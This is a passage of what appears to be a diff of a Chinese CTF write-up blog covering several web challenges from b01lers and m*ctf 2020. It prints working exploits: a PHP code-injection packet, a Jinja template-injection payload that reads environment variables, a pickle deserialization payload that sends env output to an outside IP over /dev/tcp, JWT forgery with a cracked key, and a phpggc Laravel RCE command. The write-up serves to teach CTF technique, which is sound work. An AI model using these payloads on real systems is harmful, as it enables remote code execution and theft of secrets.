class="keyword">end</span>,</span><br><span class="line">      POST = <span class="function"><span class="keyword">function</span><span class="params">(self)</span></span></span><br><span class="line">        <span class="keyword">if</span> self.POST.request == <span class="string">'listen'</span> <span class="keyword">then</span></span><br><span class="line">          <span class="keyword">if</span> <span class="keyword">not</span> (self.session.id) <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">              <span class="keyword">local</span> listener = Listens:<span class="built_in">find</span>(csrf.generate_token(self))</span><br><span class="line">              <span class="keyword">if</span> listener <span class="keyword">then</span></span><br><span class="line">                self.session.id = listener.id</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                listener = Listens:<span class="built_in">create</span>(&#123;</span><br><span class="line">                  id = csrf.generate_token(self),</span><br><span class="line">                  count = <span class="number">0</span></span><br><span class="line">                &#125;)</span><br><span class="line">                self.session.id = listener.id</span><br><span class="line">              <span class="keyword">end</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">if</span> self.session.id <span class="keyword">and</span> <span class="keyword">not</span> Listens:<span class="built_in">find</span>(self.session.id) <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> listener = Listens:<span class="built_in">create</span>(&#123;</span><br><span class="line">              id = csrf.generate_token(self),</span><br><span class="line">              count = <span class="number">0</span></span><br><span class="line">            &#125;)</span><br><span class="line">            self.session.id = listener.id</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">local</span> listener = Listens:<span class="built_in">find</span>(self.session.id)</span><br><span class="line">          <span class="keyword">local</span> data = <span class="string">"flag&#123;........&#125;"</span></span><br><span class="line">          <span class="keyword">if</span> listener.count &gt;= <span class="number">3470</span> <span class="keyword">then</span></span><br><span class="line">            <span class="keyword">local</span> ws = w.new_from_uri(<span class="string">"ws://localhost:8181"</span>)</span><br><span class="line">            <span class="built_in">assert</span>(ws:connect())</span><br><span class="line">            data = &#123;</span><br><span class="line">              user = self.session.id,</span><br><span class="line">              count = listener.count</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">assert</span>(ws:send(cjson.encode(data)))</span><br><span class="line">            data = cjson.decode(<span class="built_in">assert</span>(ws:receive()))</span><br><span class="line">            <span class="built_in">assert</span>(ws:<span class="built_in">close</span>())</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">local</span> utct</span><br><span class="line">          <span class="keyword">do</span></span><br><span class="line">            <span class="keyword">local</span> _accum_0 = &#123; &#125;</span><br><span class="line">            <span class="keyword">local</span> _len_0 = <span class="number">1</span></span><br><span class="line">            <span class="keyword">for</span> item <span class="keyword">in</span> <span class="built_in">string</span>.<span class="built_in">gmatch</span>(listener.updated_at, <span class="string">"%d+"</span>) <span class="keyword">do</span></span><br><span class="line">              _accum_0[_len_0] = item</span><br><span class="line">              _len_0 = _len_0 + <span class="number">1</span></span><br><span class="line">            <span class="keyword">end</span></span><br><span class="line">            utct = _accum_0</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">local</span> updatetime = <span class="built_in">os</span>.<span class="built_in">time</span>(&#123;</span><br><span class="line">            year = utct[<span class="number">1</span>],</span><br><span class="line">            month = utct[<span class="number">2</span>],</span><br><span class="line">            day = utct[<span class="number">3</span>],</span><br><span class="line">            hour = utct[<span class="number">4</span>],</span><br><span class="line">            <span class="built_in">min</span> = utct[<span class="number">5</span>],</span><br><span class="line">            sec = utct[<span class="number">6</span>]</span><br><span class="line">          &#125;)</span><br><span class="line">          <span class="keyword">if</span> listener ~= <span class="literal">nil</span> <span class="keyword">and</span> <span class="built_in">os</span>.<span class="built_in">time</span>() - updatetime &gt;= <span class="number">104</span> <span class="keyword">then</span></span><br><span class="line">            listener.count = listener.count + <span class="number">1</span></span><br><span class="line">            listener:update(<span class="string">"count"</span>)</span><br><span class="line">          <span class="keyword">end</span></span><br><span class="line">          <span class="keyword">return</span> &#123;</span><br><span class="line">            json = &#123;</span><br><span class="line">              <span class="built_in">status</span> = <span class="string">"success"</span>,</span><br><span class="line">              id = self.session.id,</span><br><span class="line">              timestamp = listener.updated_at,</span><br><span class="line">              count = listener.count,</span><br><span class="line">              updatetime = updatetime,</span><br><span class="line">              currenttime = <span class="built_in">os</span>.<span class="built_in">time</span>(),</span><br><span class="line">              flag = data</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">          redirect_to = <span class="string">"/"</span></span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>
-<p>这里单独看下update路由的规则。不难发现只有count&gt;=3470时会与websocket通信。此时服务端会返回一些内容。其中应该就是真正的flag了。</p>
-<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> listener.count &gt;= <span class="number">3470</span> <span class="keyword">then</span></span><br><span class="line">    <span class="keyword">local</span> ws = w.new_from_uri(<span class="string">"ws://localhost:8181"</span>)</span><br><span class="line">    <span class="built_in">assert</span>(ws:connect())</span><br><span class="line">    data = &#123;</span><br><span class="line">        user = self.session.id,</span><br><span class="line">        count = listener.count</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">assert</span>(ws:send(cjson.encode(data)))</span><br><span class="line">    data = cjson.decode(<span class="built_in">assert</span>(ws:receive()))</span><br><span class="line">    <span class="built_in">assert</span>(ws:<span class="built_in">close</span>())</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
-<p>然后就没有然后了。。。我以为不可能让选手跟websocket通信就跑去看lua有没有什么其他方法修改时间参数。结果就掉进了rabbithole.知道能通信的话，解决方法就很简单了<br>因为有源码所以在自己服务器搭建了复现下。<br>这个题还有非常脑洞的地方。它返回的结果是用flag与你的名字进行异或。所以我们传递足够长的名字并且与之异或还原flag.<br>官方脚本</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> websockets</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">()</span>:</span></span><br><span class="line">    uri = <span class="string">"ws://xxx:8181"</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> websockets.connect(uri) <span class="keyword">as</span> websocket:</span><br><span class="line">        name = <span class="string">"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"</span></span><br><span class="line">        data = &#123;<span class="string">"user"</span>: name, <span class="string">"count"</span>: <span class="number">3500</span>&#125;</span><br><span class="line">        <span class="keyword">await</span> websocket.send(json.dumps(data))</span><br><span class="line">        resp = <span class="keyword">await</span> websocket.recv()</span><br><span class="line">        <span class="keyword">for</span> r <span class="keyword">in</span> resp:</span><br><span class="line">            print(chr(ord(r) ^ ord(<span class="string">'A'</span>)), end=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">asyncio.get_event_loop().run_until_complete(solve())</span><br></pre></td></tr></table></figure>
+<p>$raw_packet = ‘{“version”:6.5,”len”:110}’;<br>$packet=json_decode($raw_packet,true);<br>$packet[“version”] = 6.5;<br>$packet[“ttl”]=”1));?&gt;&lt;?php system(‘cat /var/www/tron-eval/packets/sent/flag.packet.php’);//“;<br>$packet[“seqno”]=0;<br>$packet[“ackno”]=1;<br>$packet[“algo”]=”sha256”;<br>$calculated_ihl = strlen($packet[“version”]) + strlen(strval($packet[“len”])) + strlen(strval($packet[“ttl”])) + strlen(strval($packet[“seqno”])) + strlen(strval($packet[“ackno”])) + strlen($packet[“algo”]) + 64;<br>$calculated_ihl = $calculated_ihl + strlen(strval($calculated_ihl));<br>$packet[“ihl”]=$calculated_ihl;<br>$packet[“len”]=strlen(json_encode($packet));<br>var_dump(json_encode($packet));</p>
+<pre><code>exp
+```python
+import requests
 
+url=&#39;http://chal.ctf.b01lers.com:3002/packets/send.php&#39;
+payload=&quot;&quot;&quot;{&quot;version&quot;:6.5,&quot;len&quot;:164,&quot;ttl&quot;:&quot;1));?&gt;&lt;?php system(&#39;cat \/var\/www\/tron-eval\/packets\/sent\/flag.packet.php&#39;);\/\/&quot;,&quot;seqno&quot;:0,&quot;ackno&quot;:1,&quot;algo&quot;:&quot;sha256&quot;,&quot;ihl&quot;:157}&quot;&quot;&quot;
+r=requests.post(url,data={&#39;packet&#39;:payload})
+print(r.text)</code></pre><h3 id="Derezzy"><a href="#Derezzy" class="headerlink" title="Derezzy"></a>Derezzy</h3><p>有点可惜。其实确实不难的。主要还是没想到它的websocket端口是对外的,有些郁闷。</p>
+<p>首先题目整体上似乎是一个播放功能。然后可用的内容不多。只有一个main.js,用js-beautifyer美化下后看看其中的关键代码。</p>
+<pre><code class="javascript">function updateServer() {
+    $.post(&quot;update&quot;, {
+        request: &quot;listen&quot;,
+        path: &quot;# wait where were my non-dynamic files..../app.lua&quot;
+    }, function(a, b) {
+        &quot;success&quot; == b ? console.log(&quot;successful update&quot;) : console.log(&quot;unsuccessful update&quot;)
+    })
+}</code></pre>
+<p>得知了update路由与传递的某个参数path提示我们有app.lua.因为是non-dynamic所以就是static静态了。static下有一个files文件夹。可以在里面找到<code>app.lua</code>.</p>
+<pre><code class="lua">[{
+      update = &quot;/update&quot;
+    }] = respond_to({
+      GET = function(self)
+        return {
+          render = true
+        }
+      end,
+      POST = function(self)
+        if self.POST.request == &#39;listen&#39; then
+          if not (self.session.id) then
+            do
+              local listener = Listens:find(csrf.generate_token(self))
+              if listener then
+                self.session.id = listener.id
+              else
+                listener = Listens:create({
+                  id = csrf.generate_token(self),
+                  count = 0
+                })
+                self.session.id = listener.id
+              end
+            end
+          end
+          if self.session.id and not Listens:find(self.session.id) then
+            local listener = Listens:create({
+              id = csrf.generate_token(self),
+              count = 0
+            })
+            self.session.id = listener.id
+          end
+          local listener = Listens:find(self.session.id)
+          local data = &quot;flag{........}&quot;
+          if listener.count &gt;= 3470 then
+            local ws = w.new_from_uri(&quot;ws://localhost:8181&quot;)
+            assert(ws:connect())
+            data = {
+              user = self.session.id,
+              count = listener.count
+            }
+            assert(ws:send(cjson.encode(data)))
+            data = cjson.decode(assert(ws:receive()))
+            assert(ws:close())
+          end
+          local utct
+          do
+            local _accum_0 = { }
+            local _len_0 = 1
+            for item in string.gmatch(listener.updated_at, &quot;%d+&quot;) do
+              _accum_0[_len_0] = item
+              _len_0 = _len_0 + 1
+            end
+            utct = _accum_0
+          end
+          local updatetime = os.time({
+            year = utct[1],
+            month = utct[2],
+            day = utct[3],
+            hour = utct[4],
+            min = utct[5],
+            sec = utct[6]
+          })
+          if listener ~= nil and os.time() - updatetime &gt;= 104 then
+            listener.count = listener.count + 1
+            listener:update(&quot;count&quot;)
+          end
+          return {
+            json = {
+              status = &quot;success&quot;,
+              id = self.session.id,
+              timestamp = listener.updated_at,
+              count = listener.count,
+              updatetime = updatetime,
+              currenttime = os.time(),
+              flag = data
+            }
+          }
+        end
+        return {
+          redirect_to = &quot;/&quot;
+        }
+      end
+    })</code></pre>
+<p>这里单独看下update路由的规则。不难发现只有count&gt;=3470时会与websocket通信。此时服务端会返回一些内容。其中应该就是真正的flag了。</p>
+<pre><code class="lua">if listener.count &gt;= 3470 then
+    local ws = w.new_from_uri(&quot;ws://localhost:8181&quot;)
+    assert(ws:connect())
+    data = {
+        user = self.session.id,
+        count = listener.count
+    }
+    assert(ws:send(cjson.encode(data)))
+    data = cjson.decode(assert(ws:receive()))
+    assert(ws:close())
+end</code></pre>
+<p>然后就没有然后了。。。我以为不可能让选手跟websocket通信就跑去看lua有没有什么其他方法修改时间参数。结果就掉进了rabbithole.知道能通信的话，解决方法就很简单了<br>因为有源码所以在自己服务器搭建了复现下。<br>这个题还有非常脑洞的地方。它返回的结果是用flag与你的名字进行异或。所以我们传递足够长的名字并且与之异或还原flag.<br>官方脚本</p>
+<pre><code class="python">import asyncio
+import websockets
+import json
+
+async def solve():
+    uri = &quot;ws://xxx:8181&quot;
+    async with websockets.connect(uri) as websocket:
+        name = &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;
+        data = {&quot;user&quot;: name, &quot;count&quot;: 3500}
+        await websocket.send(json.dumps(data))
+        resp = await websocket.recv()
+        for r in resp:
+            print(chr(ord(r) ^ ord(&#39;A&#39;)), end=&quot;&quot;)
+
+asyncio.get_event_loop().run_until_complete(solve())</code></pre>
 <p>web题目就这么多。整体上比较简单。最后一个有点脑洞.不过顺带着看了下lua感觉还是蛮有意思的。写web应用的思路有点接近nodejs.</p>
 <h2 id="m-ctf2020"><a href="#m-ctf2020" class="headerlink" title="m*ctf2020"></a>m*ctf2020</h2><p>这个比赛去看时已经只剩2小时了。然后tg群里全是毛子，看不懂讲什么……只能看看gitlab上一些题目的思路了。<br>题目质量不错然后莫名的很对胃口。就是时间太紧加上tcl都没做出来2333.有一个专门的序列化分类。非常有意思。</p>
 <h3 id="Web-wiki"><a href="#Web-wiki" class="headerlink" title="Web-wiki"></a>Web-wiki</h3><p>题目开始只能明确的是xff似乎会在首页渲染，加上是python不难想到ssti.但是更改xff访问会发现我们并不能控制渲染的内容。那么说明可能需要源码了。<br>存在一个路径穿越获取源码。其实这也算python比较经典的漏洞了。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/index/&lt;path:dir&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfile</span><span class="params">(dir)</span>:</span></span><br><span class="line">    check_dir = Disabled(str(dir))</span><br><span class="line">    xff = str(request.headers.getlist(<span class="string">'X-Forwarded-For'</span>)[<span class="number">0</span>]).split(<span class="string">','</span>)[<span class="number">1</span>]</span><br><span class="line">    check_xff = Disabled(xff)</span><br><span class="line">    <span class="keyword">if</span> (check_xff.abort_rq()):</span><br><span class="line">        xff = str(request.headers.getlist(<span class="string">'X-Forwarded-For'</span>)[<span class="number">0</span>]).split(<span class="string">','</span>)[len(xff)<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (check_dir.check_blocked()):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> open(os.path.join(<span class="string">'/app/static'</span>, dir), <span class="string">'r'</span>) <span class="keyword">as</span> file:</span><br><span class="line">                data = file.read()</span><br><span class="line">                file.close()</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line">        <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> PermissionError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(my_template(xff.replace(<span class="string">'.'</span>, <span class="string">''</span>)))</span><br></pre></td></tr></table></figure>
+<pre><code class="python">@app.route(&#39;/index/&lt;path:dir&gt;&#39;)
+def getfile(dir):
+    check_dir = Disabled(str(dir))
+    xff = str(request.headers.getlist(&#39;X-Forwarded-For&#39;)[0]).split(&#39;,&#39;)[1]
+    check_xff = Disabled(xff)
+    if (check_xff.abort_rq()):
+        xff = str(request.headers.getlist(&#39;X-Forwarded-For&#39;)[0]).split(&#39;,&#39;)[len(xff)-1]
+    if not (check_dir.check_blocked()):
+        try:
+            with open(os.path.join(&#39;/app/static&#39;, dir), &#39;r&#39;) as file:
+                data = file.read()
+                file.close()
+            return data
+        except FileNotFoundError:
+            pass
+        except PermissionError:
+            pass
+    return render_template_string(my_template(xff.replace(&#39;.&#39;, &#39;&#39;)))</code></pre>
 <p>可以看到确实可以xff达成ssti.不过需要取<code>,</code>后的内容为可控点。然后不能包含<code>.</code><br>那就很简单了。用attr一条继承链或者直接</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;request[<span class="string">'application'</span>][<span class="string">'__globals__'</span>][<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>)[<span class="string">'popen'</span>](<span class="string">'env'</span>)[<span class="string">'read'</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">url=<span class="string">'http://web-library.mctf.online/index/'</span></span><br><span class="line">proxies=&#123;<span class="string">'http'</span>:<span class="string">'127.0.0.1:1080'</span>,<span class="string">'https'</span>:<span class="string">'127.0.0.1:1080'</span>&#125;</span><br><span class="line">payload=<span class="string">"""&#123;&#123;request['application']['__globals__']['__builtins__']['__import__']('os')["popen"]("env")["read"]()&#125;&#125;"""</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">'X-Forwarded-For'</span>:<span class="string">'123 ,'</span>+payload</span><br><span class="line">&#125;</span><br><span class="line">r=requests.get(url,headers=headers,proxies=proxies)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('env')['read']()}}</code></pre>
+<pre><code class="python">url=&#39;http://web-library.mctf.online/index/&#39;
+proxies={&#39;http&#39;:&#39;127.0.0.1:1080&#39;,&#39;https&#39;:&#39;127.0.0.1:1080&#39;}
+payload=&quot;&quot;&quot;{{request['application']['__globals__']['__builtins__']['__import__']('os')["popen"]("env")["read"]()}}&quot;&quot;&quot;
+headers={
+    &#39;X-Forwarded-For&#39;:&#39;123 ,&#39;+payload
+}
+r=requests.get(url,headers=headers,proxies=proxies)
+print(r.text)</code></pre>
 <p><code>FLAG=MCTF{IS_IT_NOT_SO_SECURE_?}</code></p>
 <h3 id="DeadJournal"><a href="#DeadJournal" class="headerlink" title="DeadJournal"></a>DeadJournal</h3><p>序列化分类的python序列化</p>
 <p>登录会发现cookie是jwt形式的。而其中payload的一个值identity明显是pickle序列化后base64的结果。</p>
 <p>那么需要key来伪造pickle序列化数值进行rce<br>爆破得到<code>SecreT</code><br>(我绝对不会再用到c-jwt-cracker爆破key了，效果奇差。手写python + rockyou.txt 效果好了不知道多少倍)</p>
 <p>因为禁止了os.system 以及eval这样的函数。所以用subprocess.checkoutput即可</p>
 <p>exp</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span>  b64encode</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        cmd = [<span class="string">'bash'</span>, <span class="string">'-c'</span>, <span class="string">'echo $(env) &gt; /dev/tcp/120.27.246.202/9001 '</span>]</span><br><span class="line">        <span class="keyword">return</span> __import__(<span class="string">'subprocess'</span>).check_output, (cmd,)</span><br><span class="line"></span><br><span class="line">e = exp()</span><br><span class="line">poc = b64encode(pickle.dumps(e)).decode()</span><br><span class="line">token=<span class="string">'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDE4MTE3NjQsIm5iZiI6MTYwMTgxMTc2NCwianRpIjoiOWU3YzYzOWYtZWVkZC00MzAxLWJkN2EtMmQ4ZDQxYWFjNTA0IiwiZXhwIjoxNjMzMzQ3NzY0LCJpZGVudGl0eSI6ImdBU1ZXZ0VBQUFBQUFBQ01EbkJyYkY5aGNIQXViVzlrWld4emxJd0VWWE5sY3BTVGxDbUJsSDJVS0l3U1gzTmhYMmx1YzNSaGJtTmxYM04wWVhSbGxJd1VjM0ZzWVd4amFHVnRlUzV2Y20wdWMzUmhkR1dVakExSmJuTjBZVzVqWlZOMFlYUmxsSk9VS1lHVWZaUW9qQWhwYm5OMFlXNWpaWlJvQTR3UFkyOXRiV2wwZEdWa1gzTjBZWFJsbEgyVWpBTnJaWG1VYUFKTHFvV1VUb2VVakF4c2IyRmtYMjl3ZEdsdmJuT1VqNVNNQm1Oc1lYTnpYNVJvQW93U1pYaHdhWEpsWkY5aGRIUnlhV0oxZEdWemxJK1VqQWxzYjJGa1gzQmhkR2lVWFpSb0FrNkdsR0dNQjIxaGJtRm5aWEtVakI1emNXeGhiR05vWlcxNUxtOXliUzVwYm5OMGNuVnRaVzUwWVhScGIyNlVqQkZmVTJWeWFXRnNhWHBsVFdGdVlXZGxjcFNUbENtQmxIMlVhQk5vQW5OaWRXS01DSEJoYzNOM2IzSmtsSXdETVRJemxJd0lkWE5sY201aGJXV1VqQWhoWkcxcGJqRXlNNVNNQW1sa2xFdXFkV0l1IiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.VBMiDwfU0EEaEIkq5GMH60THzvCb7QTWPEm-euvTQKs'</span></span><br><span class="line">key=<span class="string">'SecreT'</span></span><br><span class="line">data=jwt.decode(token,verify=<span class="literal">None</span>)</span><br><span class="line">data[<span class="string">'identity'</span>]=poc</span><br><span class="line">token=jwt.encode(data,key=key,algorithm=<span class="string">'HS256'</span>).decode()</span><br><span class="line">print(token)</span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="string">'http://dead-journal.mctf.online/'</span>,cookies=&#123;<span class="string">'access_token_cookie'</span>:token&#125;)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">from base64 import  b64encode
+import pickle
+import jwt
+
+
+class exp(object):
+    def __reduce__(self):
+        cmd = [&#39;bash&#39;, &#39;-c&#39;, &#39;echo $(env) &gt; /dev/tcp/120.27.246.202/9001 &#39;]
+        return __import__(&#39;subprocess&#39;).check_output, (cmd,)
+
+e = exp()
+poc = b64encode(pickle.dumps(e)).decode()
+token=&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDE4MTE3NjQsIm5iZiI6MTYwMTgxMTc2NCwianRpIjoiOWU3YzYzOWYtZWVkZC00MzAxLWJkN2EtMmQ4ZDQxYWFjNTA0IiwiZXhwIjoxNjMzMzQ3NzY0LCJpZGVudGl0eSI6ImdBU1ZXZ0VBQUFBQUFBQ01EbkJyYkY5aGNIQXViVzlrWld4emxJd0VWWE5sY3BTVGxDbUJsSDJVS0l3U1gzTmhYMmx1YzNSaGJtTmxYM04wWVhSbGxJd1VjM0ZzWVd4amFHVnRlUzV2Y20wdWMzUmhkR1dVakExSmJuTjBZVzVqWlZOMFlYUmxsSk9VS1lHVWZaUW9qQWhwYm5OMFlXNWpaWlJvQTR3UFkyOXRiV2wwZEdWa1gzTjBZWFJsbEgyVWpBTnJaWG1VYUFKTHFvV1VUb2VVakF4c2IyRmtYMjl3ZEdsdmJuT1VqNVNNQm1Oc1lYTnpYNVJvQW93U1pYaHdhWEpsWkY5aGRIUnlhV0oxZEdWemxJK1VqQWxzYjJGa1gzQmhkR2lVWFpSb0FrNkdsR0dNQjIxaGJtRm5aWEtVakI1emNXeGhiR05vWlcxNUxtOXliUzVwYm5OMGNuVnRaVzUwWVhScGIyNlVqQkZmVTJWeWFXRnNhWHBsVFdGdVlXZGxjcFNUbENtQmxIMlVhQk5vQW5OaWRXS01DSEJoYzNOM2IzSmtsSXdETVRJemxJd0lkWE5sY201aGJXV1VqQWhoWkcxcGJqRXlNNVNNQW1sa2xFdXFkV0l1IiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.VBMiDwfU0EEaEIkq5GMH60THzvCb7QTWPEm-euvTQKs&#39;
+key=&#39;SecreT&#39;
+data=jwt.decode(token,verify=None)
+data[&#39;identity&#39;]=poc
+token=jwt.encode(data,key=key,algorithm=&#39;HS256&#39;).decode()
+print(token)
+
+r=requests.get(&#39;http://dead-journal.mctf.online/&#39;,cookies={&#39;access_token_cookie&#39;:token})</code></pre>
 <p>flag在环境变量<br><code>FLAG=MCTF{pl33Z_donT_u53_p1cKl13}</code></p>
 <h3 id="2in1"><a href="#2in1" class="headerlink" title="2in1"></a>2in1</h3><p>序列化分类的php反序列化</p>
 <p>比较符合实战的题目。有两种文件上传方式。其中一个是直接上传。还有一种应该是<code>file_get_contents</code>上传.这个环境是laravel，而且可以推测上传路径。加上只有jpeg的限制，那么就能够上传phar并进行触发达成rce.</p>
 <p>phpggc真好用。。。直接生成rce的phar-&gt;jpeg文件。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./phpggc -pj src_public_uploads_test.jpeg  -o  exp.jpeg Laravel/RCE1  system env</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">./phpggc -pj src_public_uploads_test.jpeg  -o  exp.jpeg Laravel/RCE1  system env</code></pre>
 <p>然后<br><code>phar:///app/public/uploads/YWGXnnP49J.jpeg</code><br>触发<br><img src="https://upload-images.jianshu.io/upload_images/18060177-8e25c404f2ce3bf5.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-8e25c404f2ce3bf5.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p><code>flag=mctf{better_than_w@r}</code></p>
 <h3 id="Chat"><a href="#Chat" class="headerlink" title="Chat"></a>Chat</h3><p>序列化分类的java反序列化<br>首先给出服务端的依赖以及一个jar包。应该是jdk11的环境。不过只是一个thin client.</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    implementation <span class="string">'org.springframework.boot:spring-boot-starter-websocket'</span></span><br><span class="line">    compile group: <span class="string">'com.esotericsoftware'</span>, name: <span class="string">'kryo'</span>, version: <span class="string">'4.0.2'</span></span><br><span class="line">    compile group: <span class="string">'org.apache.xbean'</span>, name: <span class="string">'xbean-naming'</span>, version: <span class="string">'4.17'</span></span><br><span class="line">    compileOnly <span class="string">'org.projectlombok:lombok'</span></span><br><span class="line">    annotationProcessor <span class="string">'org.projectlombok:lombok'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="java">dependencies {
+    implementation &#39;org.springframework.boot:spring-boot-starter-websocket&#39;
+    compile group: &#39;com.esotericsoftware&#39;, name: &#39;kryo&#39;, version: &#39;4.0.2&#39;
+    compile group: &#39;org.apache.xbean&#39;, name: &#39;xbean-naming&#39;, version: &#39;4.17&#39;
+    compileOnly &#39;org.projectlombok:lombok&#39;
+    annotationProcessor &#39;org.projectlombok:lombok&#39;
+}</code></pre>
 <p>直接走到关键点:找writeObject<br><img src="https://upload-images.jianshu.io/upload_images/18060177-f91f23b07a8d3aaa.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" class="lazyload" data-srcset="https://upload-images.jianshu.io/upload_images/18060177-f91f23b07a8d3aaa.PNG?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
